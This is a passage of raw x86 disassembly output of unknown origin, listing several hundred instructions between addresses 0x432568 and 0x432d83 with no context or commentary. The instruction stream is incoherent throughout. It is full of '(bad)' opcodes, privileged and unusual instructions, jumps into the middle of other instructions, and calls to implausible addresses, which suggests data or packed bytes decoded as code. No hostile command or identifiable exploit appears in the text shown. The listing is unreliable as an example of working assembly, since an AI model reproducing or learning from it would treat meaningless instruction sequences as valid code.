  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
